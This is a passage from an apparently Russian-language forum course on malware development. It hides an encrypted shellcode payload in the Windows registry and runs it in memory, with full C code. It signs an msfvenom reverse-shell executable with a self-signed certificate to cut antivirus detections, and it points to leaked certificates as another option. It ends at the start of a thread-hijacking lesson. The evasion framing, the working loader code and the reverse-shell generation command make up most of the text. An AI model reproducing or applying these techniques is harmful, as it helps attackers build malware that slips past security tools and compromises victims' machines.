Хотя такой подход может обойти базовые меры безопасности, которые анализируют двоичный код на наличие признаков вредоносной деятельности, <b><u>но его могут пометить сетевые сканирующие утилиты. </u></b><br />
<br />
Таким образом, если payload не зашифрован, захваченные пакеты во время передачи могут содержать узнаваемые фрагменты payload.<br />
Это может раскрыть сигнатуру payload, что приведет к тому, что процесс внедрения будет помечен.<br />
<br />
В реальных условиях всегда рекомендуется шифровать или обфусцировать payload, даже если он извлекается во время выполнения.<br />
<br />
<b>Запуск финального бинарного файла</b><br />
<br />
Бинарный файл успешно извлекает payload.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780566527.png"
		data-src="https://osint42.org/attachments/1746780566527-png.105/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780566527-png.105/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780566527.png"
			title="1746780566527.png"
			width="1085" height="537" loading="lazy" />
	</div><br />
<br />
Соединения закрываются после завершения выполнения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780572635.png"
		data-src="https://osint42.org/attachments/1746780572635-png.106/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780572635-png.106/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780572635.png"
			title="1746780572635.png"
			width="1188" height="339" loading="lazy" />
	</div></div>
						

							<h2>Прячем Payload в реестре</h2>

							

							

							<div class="bbWrapper">В общем из предыдущих уроков мы с вами знаем, что payload не обязательно должен храниться внутри вредоносной программы.<br />
Вместо этого payload может быть получен во время выполнения вредоносной программы. В этой статье будет показана похожая техника, только payload будет записан в качестве значения ключа реестра и извлечен из реестра при необходимости.<br />
Так как payload будет храниться в реестре, при сканировании вредоносной программы системами безопасности они не смогут обнаружить или найти payload внутри.<br />
<br />
Код в этой статье разделен на две части. Первая часть записывает зашифрованный payload в ключ реестра. Вторая часть считывает payload из того же ключа реестра, расшифровывает его и выполняет.<br />
В статье не будет объясняться процесс шифрования/расшифрования, так как это было объяснено в предыдущих уроках.<br />
<br />
Также мы будем использовать условную компиляцию<br />
<br />
<b>Условная Компиляция</b><br />
<br />
Условная компиляция - это способ включать код в проект, который компилятор либо будет компилировать, либо не будет.<br />
<br />
Две ниже приведенные секции предоставляют базовый код, для понимания как будут написаны операции чтения и записи с использованием условной компиляции.<br />
<br />
<b>Операция записи</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define WRITEMODE // Код, который будет скомпилирован в случае если нужно записать данные в реестр

// если определено &#039;WRITEMODE&#039;
#ifdef WRITEMODE
    // Код, необходимый для записи payload в реестр
#endif
#ifdef READMODE // Код, который НЕ будет скомпилирован
#endif</code></pre>
	</div>
</div><br />
<b>Операция чтения</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define READMODE // Код, который будет скомпилирован в случае если нужно считать данные из реестра

// если определено &#039;READMODE&#039;
#ifdef READMODE
    // Код, необходимый для чтения payload из реестра
#endif
#ifdef WRITEMODE // Код, который НЕ будет скомпилирован
#endif</code></pre>
	</div>
</div><br />
<b>Запись в реестр</b><br />
<br />
Этот раздел расскажет о функции WriteShellcodeToRegistry. Функция принимает два параметра:<br />
<br />
pShellcode - Payload для записи.<br />
<br />
dwShellcodeSize - Размер записываемого payload.<br />
<br />
<b>REGISTRY &amp; REGSTRING</b><br />
<br />
Код начинается с двух предопределенных констант REGISTRY и REGSTRING, которые устанавливаются на Control Panel и Ru-SferaPW соответственно.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Ключ реестра для чтения/записи
#define REGISTRY &quot;Control Panel&quot;
#define REGSTRING &quot;RuSferaPW&quot;</code></pre>
	</div>
</div><br />
REGISTRY - это имя ключа реестра, который будет содержать payload.<br />
Полный путь REGISTRY будет такой Computer\HKEY_CURRENT_USER\Control Panel.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780741224.png"
		data-src="https://osint42.org/attachments/1746780741224-png.107/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780741224-png.107/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780741224.png"
			title="1746780741224.png"
			width="1166" height="521" loading="lazy" />
	</div><br />
<br />
То, что функция будет делать программно, - это создание нового значения строки под этим ключом реестра для хранения payload.<br />
REGSTRING — это имя создаваемого значения строки. Очевидно, что в реальной ситуации стоит использовать более реалистичное значение, такое как PanelUpdateService или AppSnapshot.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780748744.png"
		data-src="https://osint42.org/attachments/1746780748744-png.108/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780748744-png.108/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780748744.png"
			title="1746780748744.png"
			width="547" height="239" loading="lazy" />
	</div><br />
<br />
<b>Открытие дескриптора для ключа реестра</b><br />
<br />
Используется WinAPI функция RegOpenKeyExA для открытия дескриптора к указанному ключу реестра. Это необходимо для создания, редактирования или удаления значений в ключе реестра.<br />
<br />
Функция RegOpenKeyExA:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey,              // Дескриптор открытого ключа реестра
  [in, optional] LPCSTR lpSubKey,          // Имя открываемого подключа реестра (константа REGISTRY)
  [in]           DWORD  ulOptions,          // Опции при открытии ключа - Установлено в 0
  [in]           REGSAM samDesired,          // Права доступа
  [out]          PHKEY  phkResult          // Указатель на переменную, которая получает дескриптор открытого ключа
);</code></pre>
	</div>
</div><br />
Четвертый параметр RegOpenKeyExA определяет права доступа к ключу реестра. Так как программа должна создать значение в ключе реестра, выбрано KEY_SET_VALUE. Полный список прав доступа к реестру можно найти в документации Microsoft.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);</code></pre>
	</div>
</div><br />
<b>Установка значения реестра</b><br />
<br />
Далее используется функция WinAPI RegSetValueExA, которая принимает открытый дескриптор из RegOpenKeyExA и создает новое значение на основе второго параметра, REGSTRING. Она также записывает payload в только что созданное значение.<br />
<br />
Функция RegSetValueExA:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,         // Дескриптор открытого ключа реестра
  [in, optional] LPCSTR     lpValueName,  // Имя устанавливаемого значения (константа REGSTRING)
                 DWORD      Reserved,     // Установлено в 0
  [in]           DWORD      dwType,       // Тип данных, на который указывает параметр lpData
  [in]           const BYTE *lpData,      // Данные для сохранения
  [in]           DWORD      cbData        // Размер информации, на которую указывает параметр lpData, в байтах
);</code></pre>
	</div>
</div><br />
Также стоит отметить, что четвертый параметр определяет тип данных для значения реестра. В этом случае он установлен на REG_BINARY, так как payload представляет собой просто список байтов. Полный список типов данных можно найти в документации Microsoft.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);</code></pre>
	</div>
</div><br />
<b>Закрытие дескриптора ключа реестра</b><br />
<br />
Наконец, используется RegCloseKey для закрытия дескриптора ключа реестра, который был открыт.<br />
<br />
Функция RegCloseKey:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegCloseKey(
  [in] HKEY hKey // Дескриптор открытого ключа реестра, который будет закрыт
);</code></pre>
	</div>
</div><br />
<b>Запись в реестр</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf(&quot;[i] Запись 0x%p [ Размер: %ld ] в \&quot;%s\\%s\&quot; ... &quot;, pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf(&quot;[!] Ошибка при открытии ключа RegOpenKeyExA: %d\n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS){
        printf(&quot;[!] Ошибка при записи RegSetValueExA: %d\n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf(&quot;[+] Готово ! \n&quot;);


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>Чтение из реестра</b><br />
<br />
Теперь, когда payload записан в строковое значение RuSferaPw внутри ключа реестра Computer\HKEY_CURRENT_USER\Control Panel, пришло время написать другую реализацию, которая будет считывать это значение в реестре и запускать PayLoad.<br />
<br />
Этот раздел расскажет о функции ReadShellcodeFromRegistry (показанной ниже).<br />
<br />
Функция принимает два параметра:<br />
<br />
sPayloadSize - Размер payload, который нужно прочитать.<br />
ppPayload - Буфер, в котором будет храниться полученный payload.<br />
<br />
<b>Выделение памяти</b><br />
<br />
Функция начинает с выделения памяти размером sPayloadSize, в которой будет храниться payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);</code></pre>
	</div>
</div><br />
<b>Чтение значения из реестра</b><br />
<br />
Функция RegGetValueA требует указания ключа реестра и значения, которое нужно прочитать, которыми являются REGISTRY и REGSTRING соответственно.<br />
В предыдущей статье  можно было получать payload из интернета в нескольких частях любого размера, однако при работе с RegGetValueA это невозможно, так как функция не читает байты как поток данных, а скорее целиком.<br />
<b>Все это означает, что знание размера payload является обязательным при реализации чтения.</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // Дескриптор открытого ключа реестра
  [in, optional]      LPCSTR  lpSubKey, // Путь к ключу реестра относительно ключа, указанного в параметре hkey
  [in, optional]      LPCSTR  lpValue,  // Имя значения в реестре
  [in, optional]      DWORD   dwFlags,  // Флаги, которые ограничивают тип данных значения, которое будет запрошено
  [out, optional]     LPDWORD pdwType,  // Указатель на переменную, которая получит код, указывающий тип данных, сохраненных в указанном значении
  [out, optional]     PVOID   pvData,   // Указатель на буфер, который получит данные значения
  [in, out, optional] LPDWORD pcbData   // Указатель на переменную, которая определяет размер буфера, на который указывает параметр pvData, в байтах
);</code></pre>
	</div>
</div><br />
Четвертый параметр может быть использован для ограничения типа данных, однако эта реализация использует RRF_RT_ANY, что означает любой тип данных. В качестве альтернативы можно было бы использовать RRF_RT_REG_BINARY, так как payload представляет собой двоичные данные. Наконец, payload считывается в pBytes, который был ранее выделен с использованием HeapAlloc.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &amp;dwBytesRead);</code></pre>
	</div>
</div><br />
<b>Исполнение Payload</b><br />
<br />
После того как payload прочитан из реестра и сохранен в выделенном буфере, используется функция RunShellcode для его исполнения. Обратите внимание, что эта функция была описана в предыдущих модулях.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection   = NULL;

    // Выделение виртуальной памяти для исполняемого payload
    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf(&quot;[!] Ошибка при выделении памяти VirtualAlloc: %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[i] Выделенная память по адресу: 0x%p \n&quot;, pShellcodeAddress);

    // Копирование расшифрованного payload в выделенный адрес
    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    // Обнуление исходного расшифрованного payload
    memset(pDecryptedShellcode, &#039;\0&#039;, sDecryptedShellcodeSize);

    // Изменение прав доступа к памяти для обеспечения возможности выполнения
    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] Ошибка при изменении прав доступа VirtualProtect: %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить ... &quot;);
    getchar();

    // Создание потока для исполнения payload
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] Ошибка при создании потока CreateThread: %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Запись в реестр - Демо </b><br />
<br />
До запуска скомпилированного кода, показанного выше, ключ реестра выглядит следующим образом:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780767569.png"
		data-src="https://osint42.org/attachments/1746780767569-png.109/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780767569-png.109/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780767569.png"
			title="1746780767569.png"
			width="1067" height="323" loading="lazy" />
	</div><br />
<br />
После запуска программы создается новое строковое значение реестра с payload, зашифрованным с помощью RC4.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780775715.png"
		data-src="https://osint42.org/attachments/1746780775715-png.110/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780775715-png.110/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780775715.png"
			title="1746780775715.png"
			width="1265" height="448" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780782053.png"
		data-src="https://osint42.org/attachments/1746780782053-png.111/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780782053-png.111/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780782053.png"
			title="1746780782053.png"
			width="957" height="498" loading="lazy" />
	</div><br />
<br />
<b>Чтение из реестра - Демо</b><br />
<br />
Программа начинает с чтения зашифрованного payload из реестра.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780792025.png"
		data-src="https://osint42.org/attachments/1746780792025-png.112/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780792025-png.112/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780792025.png"
			title="1746780792025.png"
			width="1385" height="824" loading="lazy" />
	</div><br />
<br />
<b>Далее программа будет расшифровывать payload.</b><br />
<div class="bbImageWrapper  js-lbImage" title="1746780807470.png"
		data-src="https://osint42.org/attachments/1746780807470-png.113/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780807470-png.113/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780807470.png"
			title="1746780807470.png"
			width="1249" height="712" loading="lazy" />
	</div><br />
<br />
И, наконец, расшифрованный payload исполняется.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780815569.png"
		data-src="https://osint42.org/attachments/1746780815569-png.114/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780815569-png.114/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780815569.png"
			title="1746780815569.png"
			width="1715" height="851" loading="lazy" />
	</div></div>
						

							<h2>Разборка с цифровой подписью зверька</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746780920824.png"
		data-src="https://osint42.org/attachments/1746780920824-png.115/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780920824-png.115/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780920824.png"
			title="1746780920824.png"
			width="720" height="304" loading="lazy" />
	</div><br />
<br />
Когда пользователь пытается загрузить исполняемый файл из интернета, он часто подписан компанией как способ доказать пользователю, что это надежный исполняемый файл.<br />
<b><u>Несмотря на то что системы безопасности все равно будут проверять исполняемый файл, на него была бы направлена дополнительная проверка, если бы бинарный файл не был подписан.</u></b><br />
<br />
Предлагаю рассмотреть шаги, необходимые для подписания вредоносного бинарного файла, что может повысить его надежность.<br />
<br />
В статье демонстрируется подписание бинарного файла на исполняемом файле, созданном через Msfvenom: <b>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o mybin.exe<br />
<br />
Тест, как подпись влияет на детект:</b><br />
<br />
Перед началом бинарный файл был загружен на VirusTotal, чтобы увидеть степень обнаружения до подписания бинарного файла.<br />
Степень обнаружения довольно высока:<b> 52 из 71</b> антивирусов отметили файл как вредоносный.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780930586.png"
		data-src="https://osint42.org/attachments/1746780930586-png.116/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780930586-png.116/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780930586.png"
			title="1746780930586.png"
			width="1310" height="725" loading="lazy" />
	</div><br />
<br />
<b>Значение подписи для Безопасности</b><br />
<br />
Подпись кода важно, потому что оно предоставляет дополнительный уровень доверия к исходному коду. Однако это также может быть использовано злоумышленниками для обхода систем безопасности и обмана пользователей. Инструменты, такие как Msfvenom, позволяют создавать вредоносные бинарные файлы, которые затем могут быть подписаны, чтобы уменьшить вероятность их обнаружения.<br />
Несмотря на это, организации и пользователи должны оставаться настороже и не полагаться исключительно на подписи для верификации надежности файла.<br />
<br />
<b>Получение Сертификата</b><br />
<br />
Существует несколько способов получения сертификата:<br />
<ol>
<li data-xf-list-type="ol">Самый предпочтительный способ - приобрести сертификат у доверенного поставщика, такого как DigiCert.</li>
<li data-xf-list-type="ol">Еще одна возможность - использовать самоподписанный сертификат. Хотя это не будет таким эффективным, как сертификат от доверенного центра, в статье далее будет показано, <b>что это все равно может оказать влияние на частоту обнаружения.</b></li>
<li data-xf-list-type="ol">Последний вариант - найти действительные сертификаты, которые утекли в интернете (например, на Github).</li>
</ol><b>Генерация Сертификата</b><br />
<br />
Попробуем сами подписать свой бинарник и глянем что будет.)<br />
Для этого потребуется openssl, который предустановлен в Kali Linux.<br />
<br />
Команда для создания сертификата:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365</code></pre>
	</div>
</div><br />
После выполнения команды, система попросит вас предоставить детали для создания сертификата, такие как страна, организация и так далее. После завершения этого процесса у вас будет готов сертификат и соответствующий ему закрытый ключ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780941306.png"
		data-src="https://osint42.org/attachments/1746780941306-png.117/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780941306-png.117/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780941306.png"
			title="1746780941306.png"
			width="702" height="348" loading="lazy" />
	</div><br />
<br />
<b>Далее, генерируем файл pfx, используя файлы pem.</b> Инструмент потребует ввода ключевой фразы.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>openssl pkcs12 -inkey key.pem -in cert.pem -export -out sign.pfx</code></pre>
	</div>
</div><br />
При выполнении этой команды вам будет предложено ввести пароль для закрытого ключа (если вы установили его ранее) и затем задать пароль для нового файла pfx. Этот пароль потребуется в дальнейшем, когда вы будете использовать файл pfx для подписи исполняемых файлов или других целей.<br />
<br />
Файл PFX (также известный как PKCS #12) комбинирует сертификат и соответствующий ему закрытый ключ в один файл, который может быть использован для импорта и экспорта между системами или для безопасного хранения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780949500.png"
		data-src="https://osint42.org/attachments/1746780949500-png.118/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780949500-png.118/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780949500.png"
			title="1746780949500.png"
			width="659" height="125" loading="lazy" />
	</div><br />
<br />
<b>Подписание Бинарного Файла</b><br />
Для подписи бинарного файла требуется утилита signtool.exe, которая является частью Windows SDK. Ее можно установить <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/" target="_blank" class="link link--external" rel="noopener">[здесь]</a>.<br />
После установки бинарный файл можно подписать с помощью указанной ниже команды.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>signtool sign /f sign.pfx /p &lt;pfx-password&gt; /t http://timestamp.digicert.com /fd sha256 binary.exe</code></pre>
	</div>
</div><br />
Просмотр свойств бинарного файла теперь будет показывать вкладку &quot;Цифровая подпись&quot;, на которой отображаются детали сертификата, используемого для подписи бинарного файла. Также будет показано предупреждение о том, что сертификат не доверен.<br />
<br />
<b>Примечание:</b> Самоподписанный сертификат, очевидно, не будет иметь доверия на большинстве систем. Если вам нужно доверие к вашему сертификату, вам следует приобрести его у аккредитованного удостоверяющего центра. Подпись бинарного файла, даже самоподписанным сертификатом, может снизить вероятность его обнаружения некоторыми антивирусами, но все же это не гарантирует полное доверие к файлу.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780959052.png"
		data-src="https://osint42.org/attachments/1746780959052-png.119/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780959052-png.119/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780959052.png"
			title="1746780959052.png"
			width="441" height="493" loading="lazy" />
	</div><br />
<br />
<b>Тестирование степени обнаружения подписанного бинарного файла</b><br />
<br />
Бинарный файл был загружен обратно на VirusTotal, чтобы проверить, оказало ли подписание влияние на степень обнаружения. Как можно было ожидать, количество систем безопасности, которые отметили файл как вредоносный, сократилось с 52 до 47. На первый взгляд это может не показаться значительным уменьшением,<b><u> но следует подчеркнуть, что к файлу не были внесены никакие изменения, кроме его подписи сертификатом.</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780969377.png"
		data-src="https://osint42.org/attachments/1746780969377-png.120/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780969377-png.120/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780969377.png"
			title="1746780969377.png"
			width="1326" height="746" loading="lazy" />
	</div><br />
<br />
<b>Вывод:</b><br />
<br />
Подписание бинарного файла действительно может влиять на его обнаружение системами безопасности. Это подчеркивает важность управления и контроля над использованием сертификатов, а также необходимость для компаний и пользователей оставаться настороже даже в отношении подписанных файлов. На практике подписание может использоваться злоумышленниками как один из методов уменьшения вероятности обнаружения их вредоносного ПО.</div>
						

							<h2>Изучаем технику Thread Hijacking</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746781068918.png"
		data-src="https://osint42.org/attachments/1746781068918-png.121/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781068918-png.121/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781068918.png"
			title="1746781068918.png"
			width="1134" height="708" loading="lazy" />
	</div><br />
<br />
<b>Thread Hijacking (Похищение потока)</b> - это техника, позволяющая выполнять полезную нагрузку без создания нового потока. Этот метод работает путем приостановки потока и обновления регистра адреса команды, указывающего на следующую инструкцию в памяти, <b><u>чтобы он указывал на начало полезной нагрузки.</u></b> Когда поток возобновляет выполнение, выполняется полезная нагрузка.<br />
<br />
В этой статье будем использовать Msfvenom TCP reverse shell payload, а не полезную нагрузку calc., потому что она сохраняет поток после выполнения, тогда как полезная нагрузка calc завершила бы поток после выполнения.<br />
Тем не менее, обе полезные нагрузки работают, но сохранение потока после выполнения позволяет проводить дальнейший анализ.<br />
<br />
<b>Контекст Потока</b><br />
<br />
Прежде чем можно объяснить эту технику, необходимо понять что такое контекст потока. У каждого потока есть приоритет планирования и он содержит ряд структур, которые система сохраняет в контексте потока. Контекст потока включает всю информацию, необходимую потоку для бесперебойного выполнения, включая набор регистров ЦПУ потока и стек.<br />
<br />
GetThreadContext и SetThreadContext - это два WinAPI, которые можно использовать для получения и установки контекста потока соответственно.<br />
<br />
GetThreadContext заполняет структуру CONTEXT, которая содержит всю информацию о потоке. В то время как SetThreadContext принимает заполненную структуру CONTEXT и устанавливает ее для указанного потока.<br />
<br />
Эти два WinAPI играют ключевую роль в похищении потока, поэтому было бы полезно изучить WinAPI и связанные с ними параметры.<br />
<br />
<b>Похищение Потока vs Создание Потока</b><br />
<br />
